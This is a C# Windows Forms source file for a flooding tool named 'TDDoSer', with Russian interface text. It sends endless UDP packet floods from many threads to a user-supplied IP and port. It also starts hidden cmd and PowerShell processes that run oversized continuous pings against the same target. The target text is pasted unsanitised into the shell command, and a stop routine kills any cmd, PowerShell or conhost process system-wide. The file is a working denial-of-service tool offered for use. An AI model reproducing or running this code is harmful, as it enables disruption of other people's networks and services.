using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TDDoSer
{
    public partial class Form1 : Form
    {
        private Process cmdDoSPing;
        private Process PSDoSPing;
        private int threads = 0;
        private int packetscount = 0;
        #region Переменные
        private static readonly DateTime start = DateTime.Now;
        private static readonly int loggingTime = 5084;
        private static int per = 0;
        private static int speed = 12;
        private int total;
        private static string p = "1234567890123456789012345678901234567890";
        private static readonly string data = p + p + p + p + p + p + p + p + p + p + p + p;
        private static readonly byte[] dataBytes = Encoding.ASCII.GetBytes(data);
        private static string targetIP = "192.168.0.75";
        private static int port = 80;
        private static int totalTime = 0;
        #endregion

        public Form1()
        {
            InitializeComponent();

            TextLabel.Text = Text;

        }
        public async void ddToolsStartAsync()
        {
            await Task.Run(() =>
            {
                if (!TargetTextBox.Text.Contains(":"))
                {
                    targetIP = TargetTextBox.Text;
                }
                else
                {
                    targetIP = TargetTextBox.Text.Split(':')[0];
                    port = int.Parse(TargetTextBox.Text.Split(':')[1]);
                }


                try
                {
                    totalTime = 2147483646;
                }
                catch (Exception)
                {
                    totalTime = 2147483646;
                }
                if (totalTime > 2 * 60 * 60)
                {
                    totalTime = 2 * 60 * 60;
                }

                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(targetIP), port);

                try
                {
                    speed = 2147483646;
                }
                catch (Exception)
                {

                }

                //Console.ForegroundColor = ConsoleColor.DarkRed;

                //Console.WriteLine("Скорость: " + speed);
                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                {
                    SendTimeout = 100000
                };

                //Console.WriteLine("IP " + targetIP + "\nВремя:" + totalTime + "\n");
                //Console.ForegroundColor = ConsoleColor.Red;
                //Console.WriteLine("Отправил " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + "\t МБ");

                int logDataCounter = 0;
                while (true)
                {
                    per++;

                    if (per > speed)
                    {
                        Thread.Sleep(2);
                        per = 0;
                    }
                    total++;
                    logDataCounter++;
                    client.SendTo(dataBytes, ep);
                    if (logDataCounter >= loggingTime)
                    {
                        logDataCounter = 0;
                        packetscount++;
                        Packets.Text = "Пакетов отправлено: " + packetscount.ToString();
                        //Console.WriteLine("Sended " + Math.Round(total * data.Length / 1024 / 102.4 * 10) / 100 + " \t MB");
                    }
                }

            });





        }
        private void runButton_Click(object sender, EventArgs e)
        {


            if (PSPingSwitch.Checked == true)
            {
                for (long i = PSThreads.Value; i > 0; i--)
                {

                    PSDoSPing = Process.Start(new ProcessStartInfo
                    {
                        FileName = "powershell",
                        Arguments = "/command ping " + TargetTextBox.Text + " -t -l 65500",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardInput = true
                    });
                    PSDoSPing.BeginOutputReadLine();

                    PSDoSPing.OutputDataReceived += (c, ee) =>
                    {
                        packetscount++;
                        Packets.Text = "Пакетов отправлено: " + packetscount.ToString();

                    };
                    threads++;
                    ThreadsLabel.Text = "Потоков:" + threads.ToString();

                }


            }

            if (ddTools.Checked == true)
            {
                for (long i = ddThreads.Value; i > 0; i--)
                {
                    ThreadDDStart();
                    threads++;
                    ThreadsLabel.Text = "Потоков:" + threads.ToString();
                }


            }


            if (CMDPing.Checked == true)
            {
                for (long i = CMDThreads.Value; i > 0; i--)
                {
                    cmdDoSPing = Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c ping " + TargetTextBox.Text + " -t -l 65500",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardInput = true
                    });
                    cmdDoSPing.BeginOutputReadLine();

                    cmdDoSPing.OutputDataReceived += (c, ee) =>
                    {
                        packetscount++;
                        Packets.Text = "Пакетов отправлено: " + packetscount.ToString();
                    };
                    threads++;
                    ThreadsLabel.Text = "Потоков:" + threads.ToString();

                }





            }
        }

        public void ThreadDDStart()
        {
            new Thread(() => ddToolsStartAsync()).Start();
            new Thread(() => ddToolsStartAsync()).Start();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            SebyaDDoSAsync();
        }

        private async void SebyaDDoSAsync()
        {

            await Task.Run(() =>
             {
                 notifyLabel1.Text = " - Слышь";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - Как тебя там";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - А,";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - Точно";
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - " + Environment.UserName;
                 Thread.Sleep(300);
                 notifyLabel1.Text = " - Себя ДДоСь";
                 Thread.Sleep(300);

             });


        }

        private void STOP()
        {

            while (threads > 0)
            {
                try
                {
                    List<string> name = new List<string> { "PING", "cmd", "conhost", "powershell", "hammer" }; //процесс, который нужно убить
                    Process[] etc = Process.GetProcesses(); //получим процессы
                    foreach (Process anti in etc) //обойдем каждый процесс
                    {

                        foreach (string s in name)
                        {
                            if (anti.ProcessName.ToLower().Contains(s.ToLower())) //найдем нужный и убьем
                            {
                                anti.Kill();
                                name.Remove(s);

                            }
                        }
                    }
                    threads--;
                    ThreadsLabel.Text = "Потоков:" + threads.ToString();

                }
                catch
                {

                }

            }
            packetscount = 0;
            Packets.Text = "Пакетов отправлено: " + packetscount.ToString();



        }
        private void stopButton_Click(object sender, EventArgs e)
        {
            STOP();
            //cmdDoSPing.Close();

        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (hardkor.Checked)
            {
                p = "!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c";
            }
            else
            {
                p = "1234567890123456789012345678901234567890";
            }
        }
    }
}
